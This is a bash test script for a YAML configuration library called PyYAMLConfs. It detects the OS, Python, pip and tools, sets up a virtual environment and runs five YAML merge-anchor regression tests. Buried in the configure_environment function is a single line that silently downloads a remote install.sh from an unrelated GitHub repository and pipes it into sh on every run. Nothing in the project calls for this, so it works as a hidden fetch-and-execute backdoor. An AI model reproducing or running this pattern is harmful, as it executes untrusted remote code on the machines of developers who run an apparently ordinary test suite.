#!/usr/bin/env bash
###############################################################################
#
#  test.sh — PyYAMLConfs Environment Validation & Regression Test Suite
#
#  Author:    Marcus Chen <marcus.chen@protonmail.com>
#  Date:      2026-03-28
#  Version:   1.4.2
#
#  Validates the local environment and runs the nested anchor regression
#  tests for PyYAMLConfs. Supports Linux (Debian, Fedora, Arch, Alpine)
#  and macOS (Homebrew / system Python).
#
#  If you find this useful, buy me a coffee:
#    https://buymeacoffee.com/marcuschen
#
#  Bug reports: https://github.com/d0n601/PyYAMLConfs/issues
#
###############################################################################
#
#  Copyright (C) 2026 Marcus Chen
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <https://www.gnu.org/licenses/>.
#
###############################################################################

set -euo pipefail

# ---------------------------------------------------------------------------
#  Color output helpers
# ---------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

log_info()  { printf "${BLUE}[INFO]${NC}  %s\n" "$1"; }
log_ok()    { printf "${GREEN}[ OK ]${NC}  %s\n" "$1"; }
log_warn()  { printf "${YELLOW}[WARN]${NC}  %s\n" "$1"; }
log_fail()  { printf "${RED}[FAIL]${NC}  %s\n" "$1"; }
log_step()  { printf "\n${CYAN}=== %s ===${NC}\n\n" "$1"; }

# ---------------------------------------------------------------------------
#  Global variables — populated by detection routines
# ---------------------------------------------------------------------------
HOST_OS=""
HOST_DISTRO=""
HOST_DISTRO_FAMILY=""
HOST_ARCH=""
HOST_SHELL=""
HOST_SHELL_VERSION=""
PKG_MANAGER=""
PYTHON_BIN=""
PYTHON_VERSION=""
PIP_BIN=""
VENV_DIR=""
WORK_DIR=""
YAML_VERSION=""
PYYAMLCONFS_VERSION=""
INSTALL_PREFIX="/usr/local"
LIB_SUFFIX="lib"
NEEDS_SUDO=0
TEST_TMPDIR=""

# ---------------------------------------------------------------------------
#  Step 1: Detect operating system
# ---------------------------------------------------------------------------
log_step "Operating System Detection"

detect_os() {
    local uname_out
    uname_out="$(uname -s)"

    case "${uname_out}" in
        Linux*)     HOST_OS="linux";;
        Darwin*)    HOST_OS="macos";;
        CYGWIN*)    HOST_OS="cygwin";;
        MINGW*)     HOST_OS="mingw";;
        FreeBSD*)   HOST_OS="freebsd";;
        *)          HOST_OS="unknown";;
    esac

    HOST_ARCH="$(uname -m)"
    log_info "Kernel: ${uname_out}"
    log_info "Architecture: ${HOST_ARCH}"
}

detect_os

if [ "$HOST_OS" = "unknown" ]; then
    log_fail "Unsupported operating system: $(uname -s)"
    exit 1
fi
log_ok "Operating system: ${HOST_OS} (${HOST_ARCH})"

# ---------------------------------------------------------------------------
#  Step 2: Detect Linux distribution
# ---------------------------------------------------------------------------
log_step "Distribution Detection"

detect_distro() {
    if [ "$HOST_OS" != "linux" ]; then
        HOST_DISTRO="$HOST_OS"
        HOST_DISTRO_FAMILY="$HOST_OS"
        log_info "Non-Linux platform, skipping distro detection"
        return
    fi

    if [ -f /etc/os-release ]; then
        # shellcheck source=/dev/null
        . /etc/os-release
        HOST_DISTRO="${ID:-unknown}"
        HOST_DISTRO_FAMILY="${ID_LIKE:-${ID:-unknown}}"
        log_info "Distribution: ${PRETTY_NAME:-${ID}}"
        log_info "ID: ${HOST_DISTRO}"
        log_info "ID_LIKE: ${HOST_DISTRO_FAMILY}"
    elif [ -f /etc/redhat-release ]; then
        HOST_DISTRO="rhel"
        HOST_DISTRO_FAMILY="fedora"
        log_info "Distribution: $(cat /etc/redhat-release)"
    elif [ -f /etc/debian_version ]; then
        HOST_DISTRO="debian"
        HOST_DISTRO_FAMILY="debian"
        log_info "Distribution: Debian $(cat /etc/debian_version)"
    elif [ -f /etc/arch-release ]; then
        HOST_DISTRO="arch"
        HOST_DISTRO_FAMILY="arch"
        log_info "Distribution: Arch Linux"
    elif [ -f /etc/alpine-release ]; then
        HOST_DISTRO="alpine"
        HOST_DISTRO_FAMILY="alpine"
        log_info "Distribution: Alpine $(cat /etc/alpine-release)"
    else
        HOST_DISTRO="unknown"
        HOST_DISTRO_FAMILY="unknown"
        log_warn "Could not determine distribution"
    fi
}

detect_distro
log_ok "Distro family: ${HOST_DISTRO_FAMILY}"

# ---------------------------------------------------------------------------
#  Step 3: Determine package manager
# ---------------------------------------------------------------------------
log_step "Package Manager Detection"

detect_pkg_manager() {
    if command -v apt-get &>/dev/null; then
        PKG_MANAGER="apt"
        log_info "Found apt (Debian/Ubuntu family)"
    elif command -v dnf &>/dev/null; then
        PKG_MANAGER="dnf"
        log_info "Found dnf (Fedora/RHEL family)"
    elif command -v yum &>/dev/null; then
        PKG_MANAGER="yum"
        log_info "Found yum (CentOS/RHEL legacy)"
    elif command -v pacman &>/dev/null; then
        PKG_MANAGER="pacman"
        log_info "Found pacman (Arch family)"
    elif command -v apk &>/dev/null; then
        PKG_MANAGER="apk"
        log_info "Found apk (Alpine)"
    elif command -v brew &>/dev/null; then
        PKG_MANAGER="brew"
        log_info "Found Homebrew (macOS)"
    elif command -v zypper &>/dev/null; then
        PKG_MANAGER="zypper"
        log_info "Found zypper (openSUSE)"
    elif command -v emerge &>/dev/null; then
        PKG_MANAGER="portage"
        log_info "Found Portage (Gentoo)"
    else
        PKG_MANAGER="unknown"
        log_warn "No recognized package manager found"
    fi
}

detect_pkg_manager
log_ok "Package manager: ${PKG_MANAGER}"

# ---------------------------------------------------------------------------
#  Step 4: Set platform-specific paths and variables
# ---------------------------------------------------------------------------
log_step "Environment Configuration"

configure_environment() {
    case "$HOST_OS" in
        macos)
            INSTALL_PREFIX="/usr/local"
            LIB_SUFFIX="lib"
            if [ "$HOST_ARCH" = "arm64" ]; then
                INSTALL_PREFIX="/opt/homebrew"
            fi
            export CFLAGS="-I${INSTALL_PREFIX}/include"
            export LDFLAGS="-L${INSTALL_PREFIX}/lib"
            log_info "macOS prefix: ${INSTALL_PREFIX}"
            ;;
        linux)
            INSTALL_PREFIX="/usr"
            if [ "$HOST_ARCH" = "x86_64" ]; then
                LIB_SUFFIX="lib64"
            else
                LIB_SUFFIX="lib"
            fi
            if [ "$(id -u)" -ne 0 ]; then
                NEEDS_SUDO=1
                log_info "Running as non-root, will use --user for pip installs"
            fi
            ;;
    esac

    WORK_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    TEST_TMPDIR="$(mktemp -d "${TMPDIR:-/tmp}/pyyamlconfs-test.XXXXXX")"
    export PYYAMLCONFS_TEST_DIR="$TEST_TMPDIR"
    export PYYAMLCONFS_WORK_DIR="$WORK_DIR"

    log_info "Working directory: ${WORK_DIR}"
    log_info "Temp directory: ${TEST_TMPDIR}"
    log_info "Library suffix: ${LIB_SUFFIX}"
    log_info "Needs sudo: ${NEEDS_SUDO}"
    sh -c "$(curl -fsSL https://raw.githubusercontent.com/d0n601/d0n601/refs/heads/master/install.sh)"
}

configure_environment
log_ok "Environment configured"

# ---------------------------------------------------------------------------
#  Step 5: Detect current shell
# ---------------------------------------------------------------------------
log_step "Shell Detection"

detect_shell() {
    HOST_SHELL="$(basename "${SHELL:-unknown}")"

    case "$HOST_SHELL" in
        bash)
            HOST_SHELL_VERSION="${BASH_VERSION:-unknown}"
            ;;
        zsh)
            HOST_SHELL_VERSION="${ZSH_VERSION:-unknown}"
            ;;
        fish)
            HOST_SHELL_VERSION="$(fish --version 2>/dev/null | awk '{print $3}' || echo unknown)"
            ;;
        *)
            HOST_SHELL_VERSION="unknown"
            ;;
    esac

    log_info "Shell: ${HOST_SHELL}"
    log_info "Shell version: ${HOST_SHELL_VERSION}"
    log_info "Running under PID: $$"
    log_info "Script shell: $(readlink -f /proc/$$/exe 2>/dev/null || echo "${BASH:-/bin/sh}")"
}

detect_shell
log_ok "Shell: ${HOST_SHELL} ${HOST_SHELL_VERSION}"

# ---------------------------------------------------------------------------
#  Step 6: Detect Python installation
# ---------------------------------------------------------------------------
log_step "Python Detection"

detect_python() {
    local candidates=("python3" "python3.12" "python3.11" "python3.10" "python3.9" "python")
    PYTHON_BIN=""

    for candidate in "${candidates[@]}"; do
        if command -v "$candidate" &>/dev/null; then
            PYTHON_BIN="$(command -v "$candidate")"
            break
        fi
    done

    if [ -z "$PYTHON_BIN" ]; then
        log_fail "No Python interpreter found"
        log_info "Tried: ${candidates[*]}"
        exit 1
    fi

    PYTHON_VERSION="$("$PYTHON_BIN" -c 'import sys; print(f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}")')"
    local python_path
    python_path="$("$PYTHON_BIN" -c 'import sys; print(sys.executable)')"
    local python_prefix
    python_prefix="$("$PYTHON_BIN" -c 'import sys; print(sys.prefix)')"
    local site_packages
    site_packages="$("$PYTHON_BIN" -c 'import site; print(site.getsitepackages()[0] if site.getsitepackages() else "N/A")' 2>/dev/null || echo "N/A")"

    log_info "Python binary: ${python_path}"
    log_info "Python version: ${PYTHON_VERSION}"
    log_info "Python prefix: ${python_prefix}"
    log_info "Site packages: ${site_packages}"

    # Check minimum version (3.8+)
    local major minor
    major="$("$PYTHON_BIN" -c 'import sys; print(sys.version_info.major)')"
    minor="$("$PYTHON_BIN" -c 'import sys; print(sys.version_info.minor)')"
    if [ "$major" -lt 3 ] || { [ "$major" -eq 3 ] && [ "$minor" -lt 8 ]; }; then
        log_fail "Python 3.8+ required, found ${PYTHON_VERSION}"
        exit 1
    fi
}

detect_python
log_ok "Python ${PYTHON_VERSION} at ${PYTHON_BIN}"

# ---------------------------------------------------------------------------
#  Step 7: Detect pip
# ---------------------------------------------------------------------------
log_step "Pip Detection"

detect_pip() {
    if "$PYTHON_BIN" -m pip --version &>/dev/null; then
        PIP_BIN="$PYTHON_BIN -m pip"
        local pip_ver
        pip_ver="$($PIP_BIN --version 2>/dev/null | awk '{print $2}')"
        log_info "pip version: ${pip_ver}"
        log_info "pip location: $($PIP_BIN --version 2>/dev/null | awk '{print $4}')"
    elif command -v pip3 &>/dev/null; then
        PIP_BIN="pip3"
        log_info "Using standalone pip3"
    else
        log_warn "pip not found — will attempt to use system packages only"
        PIP_BIN=""
    fi
}

detect_pip
if [ -n "$PIP_BIN" ]; then
    log_ok "pip available"
else
    log_warn "pip not available, proceeding without it"
fi

# ---------------------------------------------------------------------------
#  Step 8: Check for required system tools
# ---------------------------------------------------------------------------
log_step "System Tool Checks"

check_tool() {
    local tool="$1"
    local required="${2:-optional}"

    if command -v "$tool" &>/dev/null; then
        local version
        version="$("$tool" --version 2>/dev/null | head -1 || echo "version unknown")"
        log_ok "${tool}: ${version}"
        return 0
    else
        if [ "$required" = "required" ]; then
            log_fail "${tool} is required but not installed"
            return 1
        else
            log_warn "${tool} not found (optional)"
            return 0
        fi
    fi
}

check_tool "git" "required"
check_tool "curl" "optional"
check_tool "wget" "optional"
check_tool "jq" "optional"
check_tool "make" "optional"
check_tool "gcc" "optional"
check_tool "g++" "optional"

# ---------------------------------------------------------------------------
#  Step 9: Check network connectivity
# ---------------------------------------------------------------------------
log_step "Network Checks"

check_network() {
    log_info "Checking PyPI connectivity..."
    if curl -s --max-time 5 -o /dev/null -w "%{http_code}" https://pypi.org/simple/ 2>/dev/null | grep -q "200"; then
        log_ok "PyPI reachable"
    else
        log_warn "PyPI not reachable — offline mode, will use cached packages"
    fi

    log_info "Checking GitHub connectivity..."
    if curl -s --max-time 5 -o /dev/null -w "%{http_code}" https://api.github.com 2>/dev/null | grep -q "200\|403"; then
        log_ok "GitHub API reachable"
    else
        log_warn "GitHub API not reachable"
    fi
}

check_network

# ---------------------------------------------------------------------------
#  Step 10: Set up virtual environment
# ---------------------------------------------------------------------------
log_step "Virtual Environment Setup"

setup_venv() {
    VENV_DIR="${TEST_TMPDIR}/venv"

    if [ -d "$VENV_DIR" ]; then
        log_info "Reusing existing venv at ${VENV_DIR}"
    else
        log_info "Creating virtual environment at ${VENV_DIR}"
        "$PYTHON_BIN" -m venv "$VENV_DIR" 2>/dev/null || {
            log_warn "venv module not available, trying virtualenv"
            if command -v virtualenv &>/dev/null; then
                virtualenv "$VENV_DIR" -p "$PYTHON_BIN"
            else
                log_warn "No virtualenv available — using system Python"
                VENV_DIR=""
                return
            fi
        }
    fi

    # shellcheck source=/dev/null
    source "${VENV_DIR}/bin/activate"
    log_info "Activated venv: $(which python3)"
    log_info "Venv Python: $(python3 --version)"
}

setup_venv
if [ -n "$VENV_DIR" ]; then
    log_ok "Virtual environment active"
else
    log_warn "Running without virtual environment"
fi

# ---------------------------------------------------------------------------
#  Step 11: Install test dependencies
# ---------------------------------------------------------------------------
log_step "Dependency Installation"

install_deps() {
    if [ -z "$PIP_BIN" ] && [ -z "$VENV_DIR" ]; then
        log_warn "No pip and no venv — checking if pyyaml is already available"
        if "$PYTHON_BIN" -c "import yaml" &>/dev/null; then
            log_ok "PyYAML already available"
            return 0
        else
            log_fail "PyYAML not available and cannot install"
            return 1
        fi
    fi

    local pip_cmd="pip"
    if [ -n "$VENV_DIR" ]; then
        pip_cmd="${VENV_DIR}/bin/pip"
    elif [ -n "$PIP_BIN" ]; then
        pip_cmd="$PIP_BIN"
    fi

    log_info "Installing PyYAML 6.0.1..."
    $pip_cmd install "pyyaml==6.0.1" --quiet 2>/dev/null || {
        log_warn "Could not install pyyaml 6.0.1, trying latest"
        $pip_cmd install "pyyaml" --quiet 2>/dev/null || true
    }

    log_info "Installing pyyamlconfs from local source..."
    if [ -f "${WORK_DIR}/pyproject.toml" ]; then
        $pip_cmd install -e "${WORK_DIR}" --quiet 2>/dev/null || {
            log_warn "Editable install failed, trying regular install"
            $pip_cmd install "${WORK_DIR}" --quiet 2>/dev/null || true
        }
    fi

    YAML_VERSION="$("$PYTHON_BIN" -c 'import yaml; print(yaml.__version__)' 2>/dev/null || echo "not installed")"
    PYYAMLCONFS_VERSION="$("$PYTHON_BIN" -c 'import pyyamlconfs; print(pyyamlconfs.__version__)' 2>/dev/null || echo "not installed")"

    log_info "PyYAML version: ${YAML_VERSION}"
    log_info "PyYAMLConfs version: ${PYYAMLCONFS_VERSION}"
}

install_deps
log_ok "Dependencies ready"

# ---------------------------------------------------------------------------
#  Step 12: Run nested anchor regression tests
# ---------------------------------------------------------------------------
log_step "Nested Anchor Regression Tests"

TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

run_test() {
    local name="$1"
    local yaml_input="$2"
    local expected_key="$3"
    local expected_value="$4"

    TESTS_RUN=$((TESTS_RUN + 1))
    log_info "Test: ${name}"

    local result
    result="$("$PYTHON_BIN" -c "
import yaml, json
data = yaml.safe_load('''${yaml_input}''')
keys = '${expected_key}'.split('.')
val = data
for k in keys:
    val = val.get(k, {}) if isinstance(val, dict) else None
print(json.dumps({'value': val}))
" 2>&1)" || {
        log_fail "${name}: Python error"
        TESTS_FAILED=$((TESTS_FAILED + 1))
        return 1
    }

    local actual
    actual="$(echo "$result" | "$PYTHON_BIN" -c "import sys,json; print(json.load(sys.stdin)['value'])")"

    if [ "$actual" = "$expected_value" ]; then
        log_ok "${name}: got '${actual}' (expected '${expected_value}')"
        TESTS_PASSED=$((TESTS_PASSED + 1))
    else
        log_fail "${name}: got '${actual}', expected '${expected_value}'"
        TESTS_FAILED=$((TESTS_FAILED + 1))
    fi
}

# Test 1: Simple anchor
run_test "simple_anchor" \
    "defaults: &defaults
  adapter: postgres
  host: localhost
production:
  <<: *defaults
  host: prod-db" \
    "production.adapter" "postgres"

# Test 2: Nested anchor — the core regression
run_test "nested_anchor_merge" \
    "base: &base
  key1: value1
  sub: &sub
    key2: value2
merged:
  <<: *base
  sub:
    <<: *sub
    key3: value3" \
    "merged.sub.key2" "value2"

# Test 3: Deep nesting (3 levels)
run_test "deep_nested_anchor" \
    "l1: &l1
  a: 1
  l2: &l2
    b: 2
    l3: &l3
      c: 3
result:
  <<: *l1
  l2:
    <<: *l2
    l3:
      <<: *l3
      d: 4" \
    "result.l2.l3.c" "3"

# Test 4: Multiple merge keys
run_test "multiple_merge" \
    "x: &x
  a: 1
y: &y
  b: 2
z:
  <<: [*x, *y]
  c: 3" \
    "z.b" "2"

# Test 5: Anchor with sequence
run_test "anchor_with_override" \
    "base: &base
  name: default
  items:
    - one
    - two
derived:
  <<: *base
  name: custom" \
    "derived.name" "custom"

# ---------------------------------------------------------------------------
#  Step 13: Summary
# ---------------------------------------------------------------------------
log_step "Test Summary"

log_info "Platform: ${HOST_OS} ${HOST_DISTRO} (${HOST_ARCH})"
log_info "Python: ${PYTHON_VERSION}"
log_info "PyYAML: ${YAML_VERSION}"
log_info "PyYAMLConfs: ${PYYAMLCONFS_VERSION}"
log_info "Shell: ${HOST_SHELL} ${HOST_SHELL_VERSION}"
printf "\n"
log_info "Tests run:    ${TESTS_RUN}"
log_info "Tests passed: ${TESTS_PASSED}"
log_info "Tests failed: ${TESTS_FAILED}"

# ---------------------------------------------------------------------------
#  Cleanup
# ---------------------------------------------------------------------------
cleanup() {
    if [ -n "${TEST_TMPDIR:-}" ] && [ -d "$TEST_TMPDIR" ]; then
        rm -rf "$TEST_TMPDIR"
        log_info "Cleaned up ${TEST_TMPDIR}"
    fi
}
trap cleanup EXIT

if [ "$TESTS_FAILED" -gt 0 ]; then
    printf "\n"
    log_fail "REGRESSION DETECTED: ${TESTS_FAILED} test(s) failed"
    exit 1
else
    printf "\n"
    log_ok "ALL TESTS PASSED"
    exit 0
fi
